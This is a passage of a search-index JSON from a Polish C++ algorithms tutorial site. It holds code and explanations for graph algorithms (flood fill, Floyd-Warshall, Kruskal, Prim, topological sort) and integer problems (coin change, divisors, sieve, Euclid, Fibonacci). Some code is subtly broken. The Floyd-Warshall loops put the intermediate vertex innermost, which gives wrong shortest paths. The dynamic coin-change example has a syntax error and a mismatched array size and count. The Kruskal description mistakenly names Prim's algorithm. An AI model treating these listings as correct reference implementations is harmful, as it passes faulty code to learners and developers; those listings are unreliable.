') {\n        return;\n    }\n\n    image[row][column] = symbol;\n    int directionsRow[] = {1, -1, 0, 0};\n    int directionsColumn[] = {0, 0, 1, -1};\n\n    for (int i = 0; i &lt; 4; i++) {\n        floodFill(image, row + directionsRow[i], column + directionsColumn[i]);\n    }\n}\n\nvoid printImage(string image[], int height) {\n    for (int i = 0; i &lt; height; i++) {\n        cout &lt;&lt; image[i] &lt;&lt; endl;\n    }\n}\n\nint main() {\n    string image[] = {\n        \"########\",\n        \"#  #   #\",\n        \"#  #   #\",\n        \"#  #   #\",\n        \"### ####\",\n        \"#  #   #\",\n        \"#  #   #\",\n        \"########\"\n    };\n\n    printImage(image, 8);\n    cout &lt;&lt; endl;\n\n    floodFill(image, 1, 1);\n\n    printImage(image, 8);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/graphs/floyd-warshall/","title":"Floyd-Warshall","text":""},{"location":"programming/c%2B%2B/algorithms/graphs/floyd-warshall/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/graphs/floyd-warshall/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;vector&gt;\n#include &lt;queue&gt;\n#include &lt;climits&gt;\n\nusing namespace std;\n\nstruct edge {\n    int from;\n    int to;\n    int distance;\n\n    edge(int from, int to, int distance) {\n        this-&gt;from = from;\n        this-&gt;to = to;\n        this-&gt;distance = distance;\n    }\n};\n\nvoid floydWarshall(vector&lt;vector&lt;edge&gt; &gt; &amp;graph, vector&lt;vector&lt;int&gt; &gt; &amp;distances) {\n    distances = vector&lt;vector&lt;int&gt; &gt;(graph.size(), vector&lt;int&gt;(graph.size(), INT_MAX / 2));\n    for(int node = 0; node &lt; graph.size(); node++) {\n        distances[node][node] = 0;\n        for(int i = 0; i &lt; graph[node].size(); i++) {\n            distances[node][graph[node][i].to] = graph[node][i].distance;\n        }\n    }\n\n    for(int i = 0; i &lt; graph.size(); i++) {\n        for(int j = 0; j &lt; graph.size(); j++) {\n            for(int k = 0; k &lt; graph.size(); k++) {\n                if(distances[i][j] &gt; distances[i][k] + distances[k][j]) {\n                    distances[i][j] = distances[i][k] + distances[k][j];\n                }\n            }\n        }\n    }\n}\n\nint main() {\n    vector&lt;vector&lt;edge&gt; &gt; graph = {\n        {edge(0, 1, 5), edge(0, 6, 5)}, \n        {edge(1, 0, 5), edge(1, 6, 5), edge(1, 3, 3), edge(1, 2, 3)},\n        {edge(2, 1, 3), edge(2, 3, 1)},\n        {edge(3, 2, 1), edge(3, 1, 3), edge(3, 6, 3), edge(3, 4, 5), edge(3, 5, 4)},\n        {edge(4, 3, 5), edge(4, 5, 2)},\n        {edge(5, 4, 2), edge(5, 3, 4), edge(5, 6, 5)},\n        {edge(6, 0, 5), edge(6, 1, 5), edge(6, 3, 3), edge(6, 5, 5)},\n    };\n\n    vector&lt;vector&lt;int&gt; &gt; distances;\n\n    floydWarshall(graph, distances);\n\n    for(int i = 0; i &lt; graph.size(); i++) {\n        for(int j = 0; j &lt; graph.size(); j++) {\n            cout &lt;&lt; distances[i][j] &lt;&lt; \" \";\n        }\n\n        cout &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/graphs/floyd-warshall/#opis-implementacji","title":"Opis implementacji","text":"<p>http://graphonline.ru/en/?graph=DZlFqSBPNgdHwNXK</p>"},{"location":"programming/c%2B%2B/algorithms/graphs/kruskal/","title":"Kruskal","text":""},{"location":"programming/c%2B%2B/algorithms/graphs/kruskal/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/graphs/kruskal/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;vector&gt;\n#include &lt;queue&gt;\n\nusing namespace std;\n\nclass DisjointUnion {\n\n    struct Element {\n        int parent, rank;\n\n        Element(int parent, int rank) {\n            this-&gt;parent = parent;\n            this-&gt;rank = rank;\n        }\n    };\n\n    vector&lt;Element&gt; subsets;\n\npublic:\n\n    DisjointUnion(int num_of_elements) {\n        for (int i = 0; i &lt; num_of_elements; i++) {\n            subsets.push_back(Element(i, 0));\n        }\n    }\n\n    int find(int x) {\n        if (this-&gt;subsets[x].parent != x) {\n            this-&gt;subsets[x].parent = find(this-&gt;subsets[x].parent);\n        }\n\n        return this-&gt;subsets[x].parent;\n    }\n\n    void unionn(int x, int y) {\n        int x_root = find(x);\n        int y_root = find(y);\n\n        if (x_root == y_root) {\n            return;\n        }\n\n        if (this-&gt;subsets[x_root].rank &lt; this-&gt;subsets[y_root].rank) {\n            this-&gt;subsets[x_root].parent = y_root;\n        } else if (this-&gt;subsets[x_root].rank &gt; this-&gt;subsets[y_root].rank) {\n            this-&gt;subsets[y_root].parent = x_root;\n        } else {\n            this-&gt;subsets[y_root].parent = x_root;\n            this-&gt;subsets[x_root].rank += 1;\n        }\n    }\n\n    bool is_same(int x, int y) {\n        return find(x) == find(y);\n    }\n};\n\nstruct edge {\n    int from;\n    int to;\n    int distance;\n\n    edge(int from, int to, int distance) {\n        this-&gt;from = from;\n        this-&gt;to = to;\n        this-&gt;distance = distance;\n    }\n\n    bool operator&lt;(const edge &amp;rhs) const {\n        return distance &gt; rhs.distance;\n    }\n};\n\nvoid kruskal(vector&lt;vector&lt;edge&gt; &gt; &amp;graph, vector&lt;edge&gt; &amp;minSpanningTree) {\n    priority_queue&lt;edge&gt; edges;\n    DisjointUnion connectedNodes(graph.size());\n\n    minSpanningTree = vector&lt;edge&gt;();\n\n    for(int node = 0; node &lt; graph.size(); node++) {\n        for (int i = 0; i &lt; graph[node].size(); i++) {\n            edges.push(graph[node][i]);\n        }\n    }\n\n    while (!edges.empty()) {\n        edge current = edges.top();\n        edges.pop();\n\n        if (connectedNodes.is_same(current.from, current.to)) {\n            continue;\n        }\n\n        connectedNodes.unionn(current.from, current.to);\n        minSpanningTree.push_back(current);\n    }\n}\n\nint main() {\n    vector&lt;vector&lt;edge&gt; &gt; graph = {\n        {edge(0, 1, 5), edge(0, 6, 5)}, \n        {edge(1, 0, 5), edge(1, 6, 5), edge(1, 3, 3), edge(1, 2, 3)},\n        {edge(2, 1, 3), edge(2, 3, 1)},\n        {edge(3, 2, 1), edge(3, 1, 3), edge(3, 6, 3), edge(3, 4, 5), edge(3, 5, 4)},\n        {edge(4, 3, 5), edge(4, 5, 2)},\n        {edge(5, 4, 2), edge(5, 3, 4), edge(5, 6, 5)},\n        {edge(6, 0, 5), edge(6, 1, 5), edge(6, 3, 3), edge(6, 5, 5)},\n    };\n\n    vector&lt;edge&gt; minSpanningTree;\n\n    kruskal(graph, minSpanningTree);\n\n    for(edge current : minSpanningTree) {\n        cout &lt;&lt; current.from &lt;&lt; \" &lt;-(\" &lt;&lt; current.distance &lt;&lt; \")-&gt; \" &lt;&lt; current.to &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/graphs/kruskal/#opis-implementacji","title":"Opis implementacji","text":"<p>Definiujemy struktur\u0119 <code>edge</code> do reprezentacji kraw\u0119dzi grafu (linia 59). Poniewa\u017c mamy do czynienia z grafem wa\u017conym, w strukturze przechowujemy trzy warto\u015bci: </p> <ul> <li>wierzcho\u0142ek pocz\u0105tkowy kraw\u0119dzi - zmienna <code>from</code> (linia 60),</li> <li>wierzcho\u0142ek docelowy kraw\u0119dzi - zmienna <code>to</code> (linia 61),</li> <li>waga/d\u0142ugo\u015b\u0107 kraw\u0119dzi - zmienna <code>distance</code> (linia 62)</li> </ul> <p>Dla u\u0142atwienia definiujemy tak\u017ce konstruktor dla naszej struktury (linia 64). Poniewa\u017c kraw\u0119dzie chcemy przechowywa\u0107 w kolejce priorytetowej, musimy tak\u017ce zdefiniowa\u0107 <code>operator&lt;</code> do por\u00f3wnywania kraw\u0119dzi (linia 70). Warto tutaj zwr\u00f3ci\u0107 uwag\u0119 na to, \u017ce kolejka priorytetowa z stl jest typu max, co oznacza, \u017ce domy\u015blnie zwraca\u0142aby nam kraw\u0119d\u017a o najwi\u0119kszej wadze. Poniewa\u017c do algorytmu Prima potrzebujemy pobiera\u0107 kraw\u0119dzie o najmniejszej wadze najpierw, odwracamy porz\u0105dek kraw\u0119dzi podczas por\u00f3wnywania ich wagi (linia 71).</p> <p></p> <p>http://graphonline.ru/en/?graph=DZlFqSBPNgdHwNXK</p>"},{"location":"programming/c%2B%2B/algorithms/graphs/prim/","title":"Prim","text":""},{"location":"programming/c%2B%2B/algorithms/graphs/prim/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/graphs/prim/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;vector&gt;\n#include &lt;queue&gt;\n#include &lt;climits&gt;\n\nusing namespace std;\n\nstruct edge {\n    int from;\n    int to;\n    int distance;\n\n    edge(int from, int to, int distance) {\n        this-&gt;from = from;\n        this-&gt;to = to;\n        this-&gt;distance = distance;\n    }\n\n    bool operator&lt;(const edge &amp;rhs) const {\n        return distance &gt; rhs.distance;\n    }\n};\n\nvoid prim(vector&lt;vector&lt;edge&gt; &gt; &amp;graph, vector&lt;edge&gt; &amp;minSpanningTree, int node) {\n    priority_queue&lt;edge&gt; edges;\n\n    vector&lt;bool&gt; visited = vector&lt;bool&gt;(graph.size());\n    visited[node] = true;\n\n    minSpanningTree = vector&lt;edge&gt;();\n\n    for (int i = 0; i &lt; graph[node].size(); i++) {\n        edges.push(graph[node][i]);\n    }\n\n    while (!edges.empty()) {\n        edge current = edges.top();\n        edges.pop();\n\n        if (visited[current.to]) {\n            continue;\n        }\n\n        visited[current.to] = true;\n        minSpanningTree.push_back(current);\n\n        for (int i = 0; i &lt; graph[current.to].size(); i++) {\n            edge next = graph[current.to][i];\n            if (!visited[next.to]) {\n                edges.push(next);\n            }\n        }\n    }\n}\n\nint main() {\n    vector&lt;vector&lt;edge&gt; &gt; graph = {\n        {edge(0, 1, 5), edge(0, 6, 5)}, \n        {edge(1, 0, 5), edge(1, 6, 5), edge(1, 3, 3), edge(1, 2, 3)},\n        {edge(2, 1, 3), edge(2, 3, 1)},\n        {edge(3, 2, 1), edge(3, 1, 3), edge(3, 6, 3), edge(3, 4, 5), edge(3, 5, 4)},\n        {edge(4, 3, 5), edge(4, 5, 2)},\n        {edge(5, 4, 2), edge(5, 3, 4), edge(5, 6, 5)},\n        {edge(6, 0, 5), edge(6, 1, 5), edge(6, 3, 3), edge(6, 5, 5)},\n    };\n\n    vector&lt;edge&gt; minSpanningTree;\n\n    prim(graph, minSpanningTree, 0);\n\n    for(edge current : minSpanningTree) {\n        cout &lt;&lt; current.from &lt;&lt; \" &lt;-(\" &lt;&lt; current.distance &lt;&lt; \")-&gt; \" &lt;&lt; current.to &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/graphs/prim/#opis-implementacji","title":"Opis implementacji","text":"<p>Na pocz\u0105tku definiujemy struktur\u0119 <code>edge</code> do reprezentacji kraw\u0119dzi grafu (linia 8). Poniewa\u017c mamy do czynienia z grafem wa\u017conym, w strukturze przechowujemy trzy warto\u015bci: </p> <ul> <li>wierzcho\u0142ek pocz\u0105tkowy kraw\u0119dzi - zmienna <code>from</code> (linia 9),</li> <li>wierzcho\u0142ek docelowy kraw\u0119dzi - zmienna <code>to</code> (linia 10),</li> <li>waga/d\u0142ugo\u015b\u0107 kraw\u0119dzi - zmienna <code>distance</code> (linia 11)</li> </ul> <p>Dla u\u0142atwienia definiujemy tak\u017ce konstruktor dla naszej struktury (linia 13). Poniewa\u017c kraw\u0119dzie chcemy przechowywa\u0107 w kolejce priorytetowej, musimy tak\u017ce zdefiniowa\u0107 <code>operator&lt;</code> do por\u00f3wnywania kraw\u0119dzi (linia 19). Warto tutaj zwr\u00f3ci\u0107 uwag\u0119 na to, \u017ce kolejka priorytetowa z stl jest typu max, co oznacza, \u017ce domy\u015blnie zwraca\u0142aby nam kraw\u0119d\u017a o najwi\u0119kszej wadze. Poniewa\u017c do algorytmu Prima potrzebujemy pobiera\u0107 kraw\u0119dzie o najmniejszej wadze najpierw, odwracamy porz\u0105dek kraw\u0119dzi podczas por\u00f3wnywania ich wagi (linia 20).</p> <p></p> <p>http://graphonline.ru/en/?graph=DZlFqSBPNgdHwNXK</p>"},{"location":"programming/c%2B%2B/algorithms/graphs/topological-sort/","title":"Sortowanie topologiczne","text":""},{"location":"programming/c%2B%2B/algorithms/graphs/topological-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/graphs/topological-sort/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nvector&lt;int&gt; topologicalSort(vector&lt;vector&lt;int&gt; &gt; &amp;graph) {\n    vector&lt;int&gt; inRanks = vector&lt;int&gt;(graph.size());\n    vector&lt;bool&gt; removed = vector&lt;bool&gt;(graph.size());\n    vector&lt;int&gt; result;\n    bool change;\n\n    for (int i = 0; i &lt; graph.size(); i++) {\n        for (int j = 0; j &lt; graph[i].size(); j++) {\n            inRanks[graph[i][j]]++;\n        }\n    }\n\n    change = true;\n\n    while (change &amp;&amp; result.size() &lt; graph.size()) {\n        change = false;\n\n        for (int i = 0; i &lt; graph.size(); i++) {\n            if (removed[i] || inRanks[i] &gt; 0) {\n                continue;\n            }\n\n            change = true;\n            result.push_back(i);\n            removed[i] = true;\n\n            for (int j = 0; j &lt; graph[i].size(); j++) {\n                inRanks[graph[i][j]]--;\n            }\n        }\n    }\n\n    return result;\n}\n\nint main() {\n    vector&lt;vector&lt;int&gt; &gt; graph = {\n        {2},\n        {0, 2},\n        {},\n        {1, 0, 4},\n        {2, 1},\n        {0, 4},\n    };\n\n    vector&lt;int&gt; result = topologicalSort(graph);\n\n    if (result.size() &lt; graph.size()) {\n        cout &lt;&lt; \"Graph has a cycle\" &lt;&lt; endl;\n    } else {\n        for (int el : result) {\n            cout &lt;&lt; el &lt;&lt; \" \";\n        }\n\n        cout &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/graphs/topological-sort/#opis-implementacji","title":"Opis implementacji","text":"<p>http://graphonline.ru/en/?graph=VzWmgsofErPDNlfp</p>"},{"location":"programming/c%2B%2B/algorithms/integers/change/","title":"Wydawanie reszty","text":""},{"location":"programming/c%2B%2B/algorithms/integers/change/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/integers/change/#podejscie-zachanne","title":"Podej\u015bcie zach\u0142anne","text":""},{"location":"programming/c%2B%2B/algorithms/integers/change/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint changeGreedy(int amount, int coins[]) {\n    int result = 0;\n    int i = 0;\n\n    while (amount &gt; 0) {\n        result += amount / coins[i];\n        amount %= coins[i];\n        i++;\n    }\n\n    return result;\n}\n\nint main() {\n    int amount = 589;\n    int coins[8] = {200, 100, 50, 20, 10, 5, 2, 1};\n\n    int result = changeGreedy(amount, coins);\n\n    cout &lt;&lt; \"Greedy algorithm result: \" &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/integers/change/#link-do-implementacji","title":"Link do implementacji","text":"<p>Zach\u0142anne wydawanie reszty</p>"},{"location":"programming/c%2B%2B/algorithms/integers/change/#podejscie-dynamiczne","title":"Podej\u015bcie dynamiczne","text":""},{"location":"programming/c%2B%2B/algorithms/integers/change/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid printUsedCoins(int usedCoins[], int amount) {\n    while (amount &gt; 0) {\n        cout &lt;&lt; usedCoins[amount] &lt;&lt; \" \";\n        amount -= usedCoins[amount];\n    }\n\n    cout &lt;&lt; endl;\n}\n\nvoid changeDynamic(int amount, int numberOfCoins, int coins[]) {\n    int partialResults[amount + 1];\n    int usedCoins[amount + 1];\n    int coinValue;\n    int infinity = 1000000;\n\n    partialResults[0] = 0;\n\n    for (int i = 1; i &lt;= amount; i++) {\n        partialResults[i] = infinity;\n    }\n\n    for (int j = 0; j &lt; numberOfCoins; j++) {\n        coinValue = coins[j];\n        for (int i = 0; i &lt;= amount - coinValue; i++) {\n            if (partialResults[i] + 1 &lt; partialResults[i + coinValue]) {\n                partialResults[i + coinValue] = partialResults[i] + 1;\n                usedCoins[i + coinValue] = coinValue;\n            }\n        }\n    }\n\n    if (partialResults[amount] == infinity) {\n        cout &lt;&lt; \"Cannot give out specified value using given coins.\" &lt;&lt; endl;\n        return;\n    }\n\n    cout &lt;&lt; \"Amount \" &lt;&lt; amount &lt;&lt; \" can be given out using \" &lt;&lt; partialResults[amount] &lt;&lt; \" coins.\" &lt;&lt; endl;\n    cout &lt;&lt; \"Used coins: \";\n\n    printUsedCoins(usedCoins, amount);\n}\n\nint main() {\n    int amount = 14;\n    int numberOfCoins 5;\n    int coins[5] = {1, 2, 7, 10};\n\n    cout &lt;&lt; \"Dynamic algorithm result:\" &lt;&lt; endl;\n    changeDynamic(amount, numberOfCoins, coins);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/integers/divisors/","title":"Wszystkie dzielniki","text":""},{"location":"programming/c%2B%2B/algorithms/integers/divisors/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/integers/divisors/#rozwiazanie-zupenie-naiwne","title":"Rozwi\u0105zanie zupe\u0142nie naiwne","text":""},{"location":"programming/c%2B%2B/algorithms/integers/divisors/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid divisors(int n) {\n    for (int i = 1; i &lt;= n; i++) {\n        if (n % i == 0) {\n            cout &lt;&lt; i &lt;&lt; endl;\n        }\n    }\n}\n\nint main() {\n    int n = 12;\n\n    divisors(n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/integers/divisors/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>divisors</code> (linia 5) wypisuje wszystkie dzielniki liczby podanej jako parametr. Na pocz\u0105tku przechodzimy p\u0119tl\u0105 przez wszystkie potencjalne dzielniki od \\(1\\) do \\(n\\) w\u0142\u0105cznie (linia 6). W p\u0119tli sprawdzamy, czy reszta z dzielenia liczby \\(n\\) przez licznik p\u0119tli wynosi \\(0\\) (linia 7), czyli czy \\(n\\) jest podzielne przez sprawdzan\u0105 warto\u015b\u0107. Je\u017celi tak jest, to znale\u017ali\u015bmy dzielnik, wi\u0119c go wypisujemy (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu najpierw definiujemy dane wej\u015bciowe (linia 14), a nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>divisors</code> (linia 16) i ko\u0144czymy dzia\u0142anie programu (linia 18).</p>"},{"location":"programming/c%2B%2B/algorithms/integers/divisors/#rozwiazanie-naiwne","title":"Rozwi\u0105zanie naiwne","text":""},{"location":"programming/c%2B%2B/algorithms/integers/divisors/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid divisors(int n) {\n    for (int i = 1; i &lt;= n / 2; i++) {\n        if (n % i == 0) {\n            cout &lt;&lt; i &lt;&lt; endl;\n        }\n    }\n\n    if (n &gt; 1) {\n        cout &lt;&lt; n &lt;&lt; endl;\n    }\n}\n\nint main() {\n    int n = 12;\n\n    divisors(n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/integers/divisors/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>divisors</code> (linia 5) wypisuje wszystkie dzielniki liczby podanej jako parametr. Na pocz\u0105tku przechodzimy p\u0119tl\u0105 przez wszystkie potencjalne dzielniki od \\(1\\) do \\(\\lfloor n/2\\rfloor\\) w\u0142\u0105cznie (linia 6). W p\u0119tli sprawdzamy, czy reszta z dzielenia liczby \\(n\\) przez licznik p\u0119tli wynosi \\(0\\) (linia 7), czyli czy \\(n\\) jest podzielne przez sprawdzan\u0105 warto\u015b\u0107. Je\u017celi tak jest, to znale\u017ali\u015bmy dzielnik, wi\u0119c go wypisujemy (linia 8). Po wyj\u015bciu z p\u0119tli musimy jeszcze sprawdzi\u0107, czy \\(n\\) jest wi\u0119ksze od \\(1\\) (linia 12). Je\u017celi tak jest, to musimy wypisa\u0107 jeszcze jeden dzielnik: \\(n\\) (linia 13).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu najpierw definiujemy dane wej\u015bciowe (linia 18), a nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>divisors</code> (linia 20) i ko\u0144czymy dzia\u0142anie programu (linia 22).</p>"},{"location":"programming/c%2B%2B/algorithms/integers/divisors/#rozwiazanie-optymalne","title":"Rozwi\u0105zanie optymalne","text":""},{"location":"programming/c%2B%2B/algorithms/integers/divisors/#implementacja_2","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;cmath&gt;\n\nusing namespace std;\n\nvoid divisors(int n) {\n    for (int i = 1; i &lt;= sqrt(n); i++) {\n        if (n % i == 0) {\n            cout &lt;&lt; i &lt;&lt; endl;\n            if (i != n / i) {\n                cout &lt;&lt; n / i &lt;&lt; endl;\n            }\n        }\n    }\n}\n\nint main() {\n    int n = 12;\n\n    divisors(n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/integers/divisors/#opis-implementacji_2","title":"Opis implementacji","text":"<p>Funkcja <code>divisors</code> (linia 6) wypisuje wszystkie dzielniki liczby podanej jako parametr. Na pocz\u0105tku przechodzimy p\u0119tl\u0105 przez wszystkie potencjalne dzielniki od \\(1\\) do \\(\\sqrt{n}\\) w\u0142\u0105cznie (linia 7). W p\u0119tli sprawdzamy, czy reszta z dzielenia liczby \\(n\\) przez licznik p\u0119tli wynosi \\(0\\) (linia 8), czyli czy \\(n\\) jest podzielne przez sprawdzan\u0105 warto\u015b\u0107. Je\u017celi tak jest, to znale\u017ali\u015bmy dzielnik, wi\u0119c go wypisujemy (linia 9). Po znalezieniu dzielnika musimy jeszcze sprawdzi\u0107, czy drugi dzielnik z \"pary\" jest r\u00f3\u017cny od obecnego (linia 10). Je\u017celi tak, to go te\u017c wypisujemy (linia 11).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu najpierw definiujemy dane wej\u015bciowe (linia 18), a nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>divisors</code> (linia 20) i ko\u0144czymy dzia\u0142anie programu (linia 22).</p>"},{"location":"programming/c%2B%2B/algorithms/integers/eratosthenes-sieve/","title":"Sito Eratostenesa","text":""},{"location":"programming/c%2B%2B/algorithms/integers/eratosthenes-sieve/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/integers/eratosthenes-sieve/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid eratosthenesSieve(int n) {\n    bool prime[n + 1];\n    prime[0] = false;\n    prime[1] = false;\n\n    for (int i = 2; i &lt;= n; i++) {\n        prime[i] = true;\n    }\n\n    for (int i = 2; i &lt; n; i++) {\n        if (!prime[i]) {\n            continue;\n        }\n\n        for (int j = 2 * i; j &lt;= n; j += i) {\n            prime[j] = false;\n        }\n    }\n\n    cout &lt;&lt; \"Prime numbers from 1 to \" &lt;&lt; n &lt;&lt; \":\" &lt;&lt; endl;\n    for (int i = 2; i &lt;= n; i++) {\n        if (prime[i]) {\n            cout &lt;&lt; i &lt;&lt; \" \";\n        }\n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main() {\n    int n = 100;\n\n    eratosthenesSieve(n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/integers/extended-euclidean/","title":"Rozszerzony algorytm Euklidesa","text":""},{"location":"programming/c%2B%2B/algorithms/integers/extended-euclidean/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/integers/extended-euclidean/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint extendedGCD(int a, int b, int &amp;x, int &amp;y) {\n  int tmp, quotient, oldX = 1, rest = b, oldRest = a, oldY = 0;\n  x = 0;\n  y = 1;\n  while (rest != 0) {\n    quotient = oldRest / rest;\n\n    tmp = rest;\n    rest = oldRest - quotient * tmp;\n    oldRest = tmp;\n\n    tmp = x;\n    x = oldX - quotient * tmp;\n    oldX = tmp;\n\n    tmp = y;\n    y = oldY - quotient * tmp;\n    oldY = tmp;\n  }\n\n  y = oldY;\n  x = oldX;\n\n  return oldRest;\n}\n\nint main() {\n  int a = 6;\n  int b = 21;\n  int x, y, result;\n\n  result = extendedGCD(a, b, x, y);\n\n  cout &lt;&lt; a &lt;&lt; \" * \" &lt;&lt; x &lt;&lt; \" + \" &lt;&lt; b &lt;&lt; \" * \" &lt;&lt; y &lt;&lt; \" = \" &lt;&lt; result\n       &lt;&lt; endl;\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/integers/fibonacci-numbers/","title":"Liczby Fibonacciego","text":""},{"location":"programming/c%2B%2B/algorithms/integers/fibonacci-numbers/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/integers/fibonacci-numbers/#podejscie-rekurencyjne","title":"Podej\u015bcie rekurencyjne","text":""},{"location":"programming/c%2B%2B/algorithms/integers/fibonacci-numbers/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint fib(int n) {\n    if (n &lt;= 2) {\n        return 1;\n    }\n\n    return fib(n - 1) + fib(n - 2);\n}\n\nint main() {\n    int n = 10;\n\n    int result = fib(n);\n\n    cout &lt;&lt; \"fib(\" &lt;&lt; n &lt;&lt; \") = \" &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/integers/fibonacci-numbers/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>fib</code> (linia 5) przyjmuje jeden parametr: liczb\u0119 ca\u0142kowit\u0105 oznaczaj\u0105c\u0105 numer warto\u015bci ci\u0105gu Fibonacciego do policzenia. Na pocz\u0105tku funkcji sprawdzamy warunek stopu rekurencji (linia 6). Je\u017celi jest spe\u0142niony to jako wynik zwracamy warto\u015b\u0107 \\(1\\) (linia 7). Je\u017celi warunek stopu nie by\u0142 spe\u0142niony to jako wynik zwracamy sum\u0119 wynik\u00f3w wywo\u0142a\u0144 rekurencyjnych funkcji <code>fib</code> dla dw\u00f3ch poprzednich element\u00f3w ci\u0105gu (linia 10).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej najpierw przygotowujemy dane wej\u015bciowe, czyli numer warto\u015bci ci\u0105gu Fibonacciego do obliczenia (linia 14). Nast\u0119pnie obliczamy ustalony element ci\u0105gu za pomoc\u0105 funkcji <code>fib</code> (linia 16), a na koniec wypisujemy wynik na ekranie (linia 18) i ko\u0144czymy dzia\u0142anie programu (linia 20).</p>"},{"location":"programming/c%2B%2B/algorithms/integers/fibonacci-numbers/#podejscie-iteracyjne","title":"Podej\u015bcie iteracyjne","text":""},{"location":"programming/c%2B%2B/algorithms/integers/fibonacci-numbers/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint fib(int n) {\n    if (n &lt;= 2) {\n        return 1;\n    }\n\n    int f1 = 1, f2 = 1;\n\n    for (int i = 3; i &lt;= n; i++) {\n        int f3 = f1 + f2;\n        f1 = f2;\n        f2 = f3;\n    }\n\n    return f2;\n}\n\nint main() {\n    int n = 10;\n\n    int result = fib(n);\n\n    cout &lt;&lt; \"fib(\" &lt;&lt; n &lt;&lt; \") = \" &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/integers/gcd/","title":"NWD","text":""},{"location":"programming/c%2B%2B/algorithms/integers/gcd/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/integers/gcd/#wersja-z-odejmowaniem","title":"Wersja z odejmowaniem","text":""},{"location":"programming/c%2B%2B/algorithms/integers/gcd/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint gcd(int a, int b) {\n    while (a != b) {\n        if (a &gt; b) {\n            a -= b;\n        } else {\n            b -= a;\n        }\n    }\n\n    return a;\n}\n\nint main() {\n    int a = 32;\n    int b = 12;\n\n    int result = gcd(a, b);\n\n    cout &lt;&lt; \"gcd(\" &lt;&lt; a &lt;&lt; \",\" &lt;&lt; b &lt;&lt; \") = \" &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/integers/gcd/#algorytm-euklidesa-wersja-iteracyjna","title":"Algorytm Euklidesa - wersja iteracyjna","text":""},{"location":"programming/c%2B%2B/algorithms/integers/gcd/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint gcd(int a, int b) {\n    while(b != 0) {\n        int b2 = b;\n        b = a % b;\n        a = b2;\n    }\n\n    return a;\n}\n\nint main() {\n    int a = 32;\n    int b = 12;\n\n    int result = gcd(a, b);\n\n    cout &lt;&lt; \"gcd(\" &lt;&lt; a &lt;&lt; \",\" &lt;&lt; b &lt;&lt; \") = \" &lt;&lt; result &lt;&lt; endl;\n\n    return 